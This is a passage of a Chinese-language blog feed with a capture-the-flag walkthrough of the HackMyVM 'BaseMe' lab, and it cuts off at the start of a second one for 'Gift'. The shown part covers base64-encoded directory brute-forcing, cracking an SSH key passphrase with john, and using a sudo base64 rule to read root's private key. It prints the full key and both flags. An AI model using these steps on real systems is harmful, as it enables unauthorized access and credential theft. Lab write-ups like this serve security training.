class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[~]<br>└─# curl <span class="hljs-string">&#x27;http://192.168.2.37&#x27;</span><br>QUxMLCBhYnNvbHV0ZWx5IEFMTCB0aGF0IHlvdSBuZWVkIGlzIGluIEJBU0U2NC4KSW5jbHVkaW5nIHRoZSBwYXNzd29yZCB0aGF0IHlvdSBuZWVkIDopClJlbWVtYmVyLCBCQVNFNjQgaGFzIHRoZSBhbnN3ZXIgdG8gYWxsIHlvdXIgcXVlc3Rpb25zLgotbHVjYXMK<br><br>&lt;!--<br>iloveyou<br>youloveyou<br>shelovesyou<br>helovesyou<br>weloveyou<br>theyhatesme<br>--&gt;<br></code></pre></td></tr></table></figure><p>显示一串BASE64字符，同时下面还有注释，猜测是相关的密码</p><p>解密上述的base64</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[~]<br>└─# <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;QUxMLCBhYnNvbHV0ZWx5IEFMTCB0aGF0IHlvdSBuZWVkIGlzIGluIEJBU0U2NC4KSW5jbHVkaW5nIHRoZSBwYXNzd29yZCB0aGF0IHlvdSBuZWVkIDopClJlbWVtYmVyLCBCQVNFNjQgaGFzIHRoZSBhbnN3ZXIgdG8gYWxsIHlvdXIgcXVlc3Rpb25zLgotbHVjYXMK&quot;</span> | <span class="hljs-built_in">base64</span> -d &gt;11.txt <br><br>┌──(root㉿kali)-[~]<br>└─# <span class="hljs-built_in">cat</span> 11.txt<br>ALL, absolutely ALL that you need is <span class="hljs-keyword">in</span> BASE64.<br>Including the password that you need :)<br>Remember, BASE64 has the answer to all your questions.<br>-lucas<br></code></pre></td></tr></table></figure><p>提示<code>你所需要的一切都在BASE64中。包括你需要的密码：) 请记住，BASE64有您所有问题的答案。</code><br>猜测所有的操作都需要经过base64编码</p><h2 id="2、目录爆破"><a href="#2、目录爆破" class="headerlink" title="2、目录爆破"></a>2、目录爆破</h2><p>目录爆破前先将字典加密成BASE64</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[/tmp]<br>└─# <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> $(<span class="hljs-built_in">cat</span> /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt);<span class="hljs-keyword">do</span> <span class="hljs-built_in">echo</span> <span class="hljs-variable">$i</span> | <span class="hljs-built_in">base64</span> &gt;&gt; dict64.txt;<span class="hljs-keyword">done</span><br></code></pre></td></tr></table></figure><p>使用加密后的字典进行目录爆破</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[/tmp]<br>└─# gobuster <span class="hljs-built_in">dir</span> -u http://192.168.2.37 -x php,bak,txt,html -w dict64.txt<br>===============================================================<br>Gobuster v3.6<br>by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)<br>===============================================================<br>[+] Url:                     http://192.168.2.37<br>[+] Method:                  GET<br>[+] Threads:                 10<br>[+] Wordlist:                dict64.txt<br>[+] Negative Status codes:   404<br>[+] User Agent:              gobuster/3.6<br>[+] Extensions:              php,bak,txt,html<br>[+] Timeout:                 10s<br>===============================================================<br>Starting gobuster <span class="hljs-keyword">in</span> directory enumeration mode<br>===============================================================<br>/aWRfcnNhCg==         (Status: 200) [Size: 2537]<br>/cm9ib3RzLnR4dAo=     (Status: 200) [Size: 25]<br>Progress: 23700 / 23705 (99.98%)<br>===============================================================<br>Finished<br>===============================================================<br></code></pre></td></tr></table></figure><p>发现两个路径，依次查看，下载得到两个文件<br><code>/aWRfcnNhCg== </code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs bash">LS0tLS1CRUdJTiBPUEVOU1NIIFBSSVZBVEUgS0VZLS0tLS0KYjNCbGJuTnphQzFyWlhrdGRqRUFB<br>QUFBQ21GbGN6STFOaTFqZEhJQUFBQUdZbU55ZVhCMEFBQUFHQUFBQUJCVHhlOFlVTApCdHpmZnRB<br>ZFBncDhZWkFBQUFFQUFBQUFFQUFBRVhBQUFBQjNOemFDMXljMkVBQUFBREFRQUJBQUFCQVFDWkNY<br>dkVQbk8xCmNiaHhxY3RCRWNCRFpqcXJGZm9sd1ZLbXBCZ1kwN00zQ0s3cE8xMFVnQnNMeVl3QXpK<br>RXc0ZTZZZ1BOU3lDRFdGYU5US0cKMDdqZ2NncmdncmU4ZVBDTU5GQkNBR2FZSG1MckZJc0tEQ0xJ<br>NE5FNTR0NThJVUhlWENaejcyeFRvYkwvcHRMazI2UkJuaAo3YkhHMUpqR2x4T2tPNm0rMW9GTkx0<br>TnVEMlFQbDhzYlp0RXpYNFM5bk5aL2RweVJwTWZtQjczck4zeXlJeWxldlZERXl2CmY3Q1o3b1JP<br>NDZ1RGdGUHk1VnprbmRDZUpGMll0WkJYZjVnamMyZmFqTVh2cStiOG9sOFJaWjZqSFhBaGlibEJY<br>d3BBbTQKdkxZZnh6STI3QlpGbm90ZUJuYmR6d1NMNWFwQkY1Z1lXSkFIS2ovSjZNaERqMUdLQUZj<br>MUFBQUQwTjlVRFRjVXh3TXQ1WApZRklaSzhpZUJMME5PdXdvY2RnYlV1a3RDMjFTZG5TeTZvY1cz<br>aW1NKzNteldqUGRvQksvSG8zMzl1UG1CV0k1c2JNcnBLCnhrWk1ubCtyY1RiZ3o0c3d2OGdOdUto<br>VWM3d1RndHJOWCtQTk1kSUFMTnBzeFlMdC9sNTZHSzhSNEo4ZkxJVTUrTW9qUnMKKzFOcllzOEo0<br>cm5PMXFXTm9KUlpvRGxBYVlxQlY5NWNYb0FFa3dVSFZ1c3RmZ3hVdHJZS3ArWVBGSWd4OG9rTWpK<br>Z25iaQpOTlczVHp4bHVOaTVvVWhhbEgyREoya2hLREdRVWk5Uk9GY3NFWGVKWHQzbGdwWlp0MWhy<br>UURBMW84alRYZVM0K2RXN25aCnpqZjNwME03N2IvTnZjWkUrb1hZUTFnNVhwMVFTT1Niait0bG13<br>NTRMN0VxYjFVaFpnblE3WnNLQ29hWTlTdUFjcW0zRTAKSUpoK0krWnYxZWdTTVMvRE9ISXhPM3Bz<br>UWtjaUxqa3BhK0d0d1FNbDFaQUpIUWFCNnE3MEpKY0JDZlZzeWtkWTUyTEtESQpweFpZcExabXlE<br>eDhUVGFBOEpPbXZHcGZOWmtNVTRJMGk1L1pUNjVTUkZKMU5sQkNOd2N3dE9sOWs0UFc1TFZ4TnNH<br>UkNKCk1KcjhrNUFjMENYMDNmWEVTcG1zVVVWUysvRGovaG50SHc4OWRPOEhjcXFJVUVwZUViZlRX<br>THZheDBDaVNoM0tqU2NlSnAKKzhnVXlER3ZDa2N5Vm5lVVFqbW1yUnN3UmhUTnh4S1JCWnNla0d3<br>SHBvOGhEWWJVRUZacXp6TEFRYkJJQWRybDF0dDdtVgp0VkJybXBNNkN3SmR6WUVsMjFGYUs4anZk<br>eUN3UHI1SFVndHV4clNwTHZuZGNud1BheEpXR2k0UDQ3MUREWmVSWURHY1doCmk2YklDckxRZ2VK<br>bEhhRVVtclFDNVJkdjAzendJOVU4RFhVWi9PSGI0MFBMOE1YcUJ0VS9iNkNFVTlKdXpKcEJyS1or<br>aysKdFNuN2hyOGhwcFQydFVTeER2QytVU01tdy9XRGZha2pmSHBvTndoN1B0NWkwY3d3cGtYRlF4<br>SlB2UjBiTHh2WFpuKzN4dwpON2J3NDVGaEJaQ3NIQ0FiVjIraFZzUDBseXhDUU9qN3lHa0JqYTg3<br>UzFlMHE2V1pqakI0U3ByZW5Ia083dGc1UTBIc3VNCkFpZi8wMkhIeldHK0NSL0lHbEZzTnRxMXZ5<br>bHQyeCtZLzA5MXZDa1JPQkRhd2pIei84b2d5MkZ6ZzhKWVRlb0xrSHdER1EKTytUb3dBMTBSQVRl<br>azZaRUl4aDZTbXRERy9WNXplV0N1RW1LNHNSVDNxMUZTdnBCMS9IK0Z4c0dDb1BJZzhGemNpR0No<br>MgpUTHVza2NYaWFnbnM5TjFSTE9ubEhoaVpkOFJaQTBaZzdvWklhQnZhWm5oWllHeWNwQUpwV0tl<br>YmpydG9rTFl1TWZYUkxsCjMvU0FlVWw3MkVBM20xRElueHNQZ3VGdWswMHJvTWM3N042ZXJZN3Rq<br>T1pMVllQb1NpeWdEUjFBN2Yzell6KzBpRkk0ckwKTkQ4aWtnbVF2RjZocnd3SkJycC8weEtFYU1U<br>Q0tMdnl5WjNlRFNkQkRQcmtUaGhGd3JQcEk2K0V4OFJ2Y1dJNmJUSkFXSgpMZG1tUlhVUy9EdE8r<br>NjkvYWlkdnhHQVlvYisxTT0KLS0tLS1FTkQgT1BFTlNTSCBQUklWQVRFIEtFWS0tLS0tCg==<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs bash">-----BEGIN OPENSSH PRIVATE KEY-----<br>b3BlbnNzaC1rZXktdjEAAAAACmFlczI1Ni1jdHIAAAAGYmNyeXB0AAAAGAAAABBTxe8YUL<br>BtzfftAdPgp8YZAAAAEAAAAAEAAAEXAAAAB3NzaC1yc2EAAAADAQABAAABAQCZCXvEPnO1<br>cbhxqctBEcBDZjqrFfolwVKmpBgY07M3CK7pO10UgBsLyYwAzJEw4e6YgPNSyCDWFaNTKG<br>07jgcgrggre8ePCMNFBCAGaYHmLrFIsKDCLI4NE54t58IUHeXCZz72xTobL/ptLk26RBnh<br>7bHG1JjGlxOkO6m+1oFNLtNuD2QPl8sbZtEzX4S9nNZ/dpyRpMfmB73rN3yyIylevVDEyv<br>f7CZ7oRO46uDgFPy5VzkndCeJF2YtZBXf5gjc2fajMXvq+b8ol8RZZ6jHXAhiblBXwpAm4<br>vLYfxzI27BZFnoteBnbdzwSL5apBF5gYWJAHKj/J6MhDj1GKAFc1AAAD0N9UDTcUxwMt5X<br>YFIZK8ieBL0NOuwocdgbUuktC21SdnSy6ocW3imM+3mzWjPdoBK/Ho339uPmBWI5sbMrpK<br>xkZMnl+rcTbgz4swv8gNuKhUc7wTgtrNX+PNMdIALNpsxYLt/l56GK8R4J8fLIU5+MojRs<br>+1NrYs8J4rnO1qWNoJRZoDlAaYqBV95cXoAEkwUHVustfgxUtrYKp+YPFIgx8okMjJgnbi<br>NNW3TzxluNi5oUhalH2DJ2khKDGQUi9ROFcsEXeJXt3lgpZZt1hrQDA1o8jTXeS4+dW7nZ<br>zjf3p0M77b/NvcZE+oXYQ1g5Xp1QSOSbj+tlmw54L7Eqb1UhZgnQ7ZsKCoaY9SuAcqm3E0<br>IJh+I+Zv1egSMS/DOHIxO3psQkciLjkpa+GtwQMl1ZAJHQaB6q70JJcBCfVsykdY52LKDI<br>pxZYpLZmyDx8TTaA8JOmvGpfNZkMU4I0i5/ZT65SRFJ1NlBCNwcwtOl9k4PW5LVxNsGRCJ<br>MJr8k5Ac0CX03fXESpmsUUVS+/Dj/hntHw89dO8HcqqIUEpeEbfTWLvax0CiSh3KjSceJp<br>+8gUyDGvCkcyVneUQjmmrRswRhTNxxKRBZsekGwHpo8hDYbUEFZqzzLAQbBIAdrl1tt7mV<br>tVBrmpM6CwJdzYEl21FaK8jvdyCwPr5HUgtuxrSpLvndcnwPaxJWGi4P471DDZeRYDGcWh<br>i6bICrLQgeJlHaEUmrQC5Rdv03zwI9U8DXUZ/OHb40PL8MXqBtU/b6CEU9JuzJpBrKZ+k+<br>tSn7hr8hppT2tUSxDvC+USMmw/WDfakjfHpoNwh7Pt5i0cwwpkXFQxJPvR0bLxvXZn+3xw<br>N7bw45FhBZCsHCAbV2+hVsP0lyxCQOj7yGkBja87S1e0q6WZjjB4SprenHkO7tg5Q0HsuM<br>Aif/02HHzWG+CR/IGlFsNtq1vylt2x+Y/091vCkROBDawjHz/8ogy2Fzg8JYTeoLkHwDGQ<br>O+TowA10RATek6ZEIxh6SmtDG/V5zeWCuEmK4sRT3q1FSvpB1/H+FxsGCoPIg8FzciGCh2<br>TLuskcXiagns9N1RLOnlHhiZd8RZA0Zg7oZIaBvaZnhZYGycpAJpWKebjrtokLYuMfXRLl<br>3/SAeUl72EA3m1DInxsPguFuk00roMc77N6erY7tjOZLVYPoSiygDR1A7f3zYz+0iFI4rL<br>ND8ikgmQvF6hrwwJBrp/0xKEaMTCKLvyyZ3eDSdBDPrkThhFwrPpI6+Ex8RvcWI6bTJAWJ<br>LdmmRXUS/DtO+69/aidvxGAYob+1M=<br>-----END OPENSSH PRIVATE KEY-----<br></code></pre></td></tr></table></figure><p><code>/cm9ib3RzLnR4dAo=</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">Tm90aGluZyBoZXJlIDooCg==<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">Nothing here :(<br></code></pre></td></tr></table></figure><h1 id="SSH登录"><a href="#SSH登录" class="headerlink" title="SSH登录"></a>SSH登录</h1><p>根据上述得到的ssh秘钥，尝试使用之前的看到的用户名<code>lucas</code>进行登录</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[/tmp]<br>└─# ssh lucas@192.168.2.37 -i ./id_rsa<br>Enter passphrase <span class="hljs-keyword">for</span> key <span class="hljs-string">&#x27;./id_rsa&#x27;</span>: <br></code></pre></td></tr></table></figure><p><code>私钥的权限必须为600</code></p><p>私钥需要密码，根据上述的密码进行BASE64编码后爆破</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[/tmp]<br>└─# <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> $(<span class="hljs-built_in">cat</span> 3.txt); <span class="hljs-keyword">do</span> <span class="hljs-built_in">echo</span> <span class="hljs-variable">$i</span> | <span class="hljs-built_in">base64</span> &gt;&gt;33.txt;<span class="hljs-keyword">done</span><br><br>┌──(root㉿kali)-[/tmp]<br>└─# <span class="hljs-built_in">cat</span> 33.txt <br>aWxvdmV5b3UK<br>eW91bG92ZXlvdQo=<br>c2hlbG92ZXN5b3UK<br>aGVsb3Zlc3lvdQo=<br>d2Vsb3ZleW91Cg==<br>dGhleWhhdGVzbWUK<br></code></pre></td></tr></table></figure><p>使用<code>john</code>进行爆破</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[/tmp]<br>└─# ssh2john id_rsa <br><br>┌──(root㉿kali)-[/tmp]<br>└─# ssh2john id_rsa &gt; tmp            <br><br>┌──(root㉿kali)-[/tmp]<br>└─# john tmp --wordlist=output.txt   <br>Using default input encoding: UTF-8<br>Loaded 1 password <span class="hljs-built_in">hash</span> (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])<br>Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 2 <span class="hljs-keyword">for</span> all loaded hashes<br>Cost 2 (iteration count) is 16 <span class="hljs-keyword">for</span> all loaded hashes<br>Will run 8 OpenMP threads<br>Press <span class="hljs-string">&#x27;q&#x27;</span> or Ctrl-C to abort, almost any other key <span class="hljs-keyword">for</span> status<br>Warning: Only 6 candidates left, minimum 8 needed <span class="hljs-keyword">for</span> performance.<br>aWxvdmV5b3UK     (id_rsa)     <br>1g 0:00:00:00 DONE (2025-06-23 16:49) 2.173g/s 13.04p/s 13.04c/s 13.04C/s aWxvdmV5b3UK..dGhleWhhdGVzbWUK<br>Use the <span class="hljs-string">&quot;--show&quot;</span> option to display all of the cracked passwords reliably<br>Session completed. <br></code></pre></td></tr></table></figure><p><strong>USER FLAG</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">lucas@baseme:~$ <span class="hljs-built_in">cat</span> user.txt <br>HMV8nnJAJAJA<br></code></pre></td></tr></table></figure><h1 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h1><p>执行<code>sudo -l</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">lucas@baseme:~$ <span class="hljs-built_in">sudo</span> -l<br>Matching Defaults entries <span class="hljs-keyword">for</span> lucas on baseme:<br>    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin<br><br>User lucas may run the following commands on baseme:<br>    (ALL) NOPASSWD: /usr/bin/base64<br></code></pre></td></tr></table></figure><p>发现base64不需要密码即可执行root权限，直接读取文件即可</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">LFILE=file_to_read<br><span class="hljs-built_in">sudo</span> <span class="hljs-built_in">base64</span> <span class="hljs-string">&quot;<span class="hljs-variable">$LFILE</span>&quot;</span> | <span class="hljs-built_in">base64</span> --decode<br></code></pre></td></tr></table></figure><p>读取root下面的ssh私钥</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs bash">lucas@baseme:~$ <span class="hljs-built_in">sudo</span> <span class="hljs-built_in">base64</span> /root/.ssh/id_rsa | <span class="hljs-built_in">base64</span> -d<br>-----BEGIN OPENSSH PRIVATE KEY-----<br>b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABFwAAAAdzc2gtcn<br>NhAAAAAwEAAQAAAQEAw6MgMnxUy+W9oem0Uhr2cJiez37qVubRK9D4kdu7H5NQ/Z0FFp2B<br>IdV3wx9xDWAICJgtYQUvOV7KFNAWvEXTDdhBwdiUcWEJ4AOXK7+5v7x4b8vuG5zK0lTVxp<br>DEBE8faPj3UaHsa1JUVaDngTIkCa6VBICvG0DCcfL8xHBpCSIfoHfpqmOpWT/pWXvGI3tk<br>/Ku/STY7Ay8HtSgoqCcf3F+lb9J9kwKhFg9eLO5QDuFujb1CN7gUy8xhgNanUViyCZRwn7<br>px+DfU+nscSEfG1zgfgqn2hCbBYqaP0jBgWcVL6YoMiwCS3jhmeFG4C/p51j3gI6b8yz9a<br>S+DtdTpDwQAAA8D82/wZ/Nv8GQAAAAdzc2gtcnNhAAABAQDDoyAyfFTL5b2h6bRSGvZwmJ<br>7PfupW5tEr0PiR27sfk1D9nQUWnYEh1XfDH3ENYAgImC1hBS85XsoU0Ba8RdMN2EHB2JRx<br>YQngA5crv7m/vHhvy+4bnMrSVNXGkMQETx9o+PdRoexrUlRVoOeBMiQJrpUEgK8bQMJx8v<br>zEcGkJIh+gd+mqY6lZP+lZe8Yje2T8q79JNjsDLwe1KCioJx/cX6Vv0n2TAqEWD14s7lAO<br>4W6NvUI3uBTLzGGA1qdRWLIJlHCfunH4N9T6exxIR8bXOB+CqfaEJsFipo/SMGBZxUvpig<br>yLAJLeOGZ4UbgL+nnWPeAjpvzLP1pL4O11OkPBAAAAAwEAAQAAAQBIArRoQOGJh9AMWBS6<br>oBgUC+lw4Ptq710Q7sOAFMxE7BnEsFZeI62TgZqqpNkdHjr2xuT1ME5YpK5niMzFkkIEd5<br>SEwK6rKRfUcB3lyZWaoMoIBJ1pZoY1c2qYw1KTb3hVUEbgsmRugIhwWGC+anFfavaJCMDr<br>nCO2g8VMnT/cTyAv/Qmi8m868KNEzcuzGV5ozHl1XLffHM9R/cqPPyAYaQIa9Z+kS6ou9R<br>iMTjTSxOPnfh286kgx0ry1se9BBlrEc5251R/PRkEKYrMj3AIwI30qvYlAtNfcCFhoJXLq<br>vWystPARwiUs7WYBUHRf6bPP/pHTTvwwb2bs51ngImpdAAAAgDaWnQ7Lj7Vp+mTjhSu4oG<br>ptDHNd2uuqB1+CHRcaVutUmknxvxG3p957UbvNp6e0+ePKtAIakrzbpAo6u25poyWugAuz<br>X2nQhqsQh6yrThDJlTiDMeV7JNGFbGOcanXXXHt3tjfyrS0+aM87WmwqNyh6nfgy1C5axR<br>fKZG8ivz5iAAAAgQD83QmCIcbZaCOlGwgHGcuCUDcxGY1QlIRnbM5VAjimNezGFs9f0ExD<br>SiTwFsmITP//njsbRZP2laiKKO6j4yp5LpfgDB5QHs+g4nXvDn6ns64gCKo7tf2bPP8VCe<br>FWyc2JyqREwE3WmyhkPlyr9xAZerZ+7Fz+NFueRYzDklWg8wAAAIEAxhBeLqbo6/GUKXF5<br>rFRatLXI43Jrd9pyvLx62KghsnEBEk7my9sbU5dvYBLztS+lfPCRxV2ZzpjYdN4SDJbXIR<br>txBaLJe3c4uIc9WjyxGwUK9IL65rSrRVERHsTO525ofPWGQEa2A+pRCpz3A4Y41fy8Y9an<br>2B2NmfTAfEkWFXsAAAALcm9vdEBiYXNlbWU=<br>-----END OPENSSH PRIVATE KEY-----<br></code></pre></td></tr></table></figure><p>使用root用户的ssh私钥进行登录</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs bash">lucas@baseme:~$ <span class="hljs-built_in">chmod</span> 600 <span class="hljs-built_in">id</span><br>lucas@baseme:~$ ssh root@127.0.0.1 -i <span class="hljs-built_in">id</span><br>The authenticity of host <span class="hljs-string">&#x27;127.0.0.1 (127.0.0.1)&#x27;</span> cant be established.<br>ECDSA key fingerprint is SHA256:Hlyr217g0zTkGOpiqimkeklOhJ4kYRLtHyEh0IgMEbM.<br>Are you sure you want to <span class="hljs-built_in">continue</span> connecting (<span class="hljs-built_in">yes</span>/no)? <span class="hljs-built_in">yes</span><br>Warning: Permanently added <span class="hljs-string">&#x27;127.0.0.1&#x27;</span> (ECDSA) to the list of known hosts.<br>Linux baseme 4.19.0-9-amd64 <span class="hljs-comment">#1 SMP Debian 4.19.118-2+deb10u1 (2020-06-07) x86_64</span><br><br>The programs included with the Debian GNU/Linux system are free software;<br>the exact distribution terms <span class="hljs-keyword">for</span> each program are described <span class="hljs-keyword">in</span> the<br>individual files <span class="hljs-keyword">in</span> /usr/share/doc/*/copyright.<br><br>Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent<br>permitted by applicable law.<br>Last login: Mon Sep 28 12:47:13 2020 from 192.168.1.59<br>root@baseme:~# <br></code></pre></td></tr></table></figure><p> <strong>ROOT FLAG</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">root@baseme:~# <span class="hljs-built_in">cat</span> root.txt <br>HMVFKBS64<br></code></pre></td></tr></table></figure><p>或者直接使用base64读取flag即可</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">lucas@baseme:~$ <span class="hljs-built_in">sudo</span> <span class="hljs-built_in">base64</span> /root/root.txt | <span class="hljs-built_in">base64</span> -d<br>HMVFKBS64<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Hackmyvm</category>
      
    </categories>
    
    
    <tags>
      
      <tag>base64</tag>
      
      <tag>john</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Gift</title>
    <link href="/Hackmyvm/Gift/"/>
    <url>/Hackmyvm/Gift/</url>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="靶机说明"><a href="#靶机说明" class="headerlink" title="靶机说明"></a>靶机说明</h1><p><a href="https://hackmyvm.eu/machines/machine.php?vm=Gift">https://hackmyvm.eu/machines/machine.php?vm=Gift</a></p><hr><h1 id="主机探测"><a href="#主机探测" class="headerlink" title="主机探测"></a>主机探测</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[~]<br>└─# nmap -sn 192.168.2.0/24                                       <br>Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-06-23 10:32 CST<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.1<br>Host is up (0.00045s latency).<br>MAC Address: 0A:00:27:00:00:0A (Unknown)<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.2<br>Host is up (0.00073s latency).<br>MAC Address: 08:00:27:51:E4:3B (Oracle VirtualBox virtual NIC)<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.36<br>Host is up (0.00062s latency).<br>MAC Address: 08:00:27:08:75:F7 (Oracle VirtualBox virtual NIC)<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.4<br>Host is up.<br>Nmap <span class="hljs-keyword">done</span>: 256 IP addresses (4 hosts up) scanned <span class="hljs-keyword">in</span> 2.13 seconds<br></code></pre></td></tr></table></figure><p>IP地址：<code>192.168.2.36</code></p><h1 id="nmap扫描"><a href="#nmap扫描" class="headerlink" title="nmap扫描"></a>nmap扫描</h1><h2 id="1、全端口扫描"><a href="#1、全端口扫描" class="headerlink" title="1、全端口扫描"></a>1、全端口扫描</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span 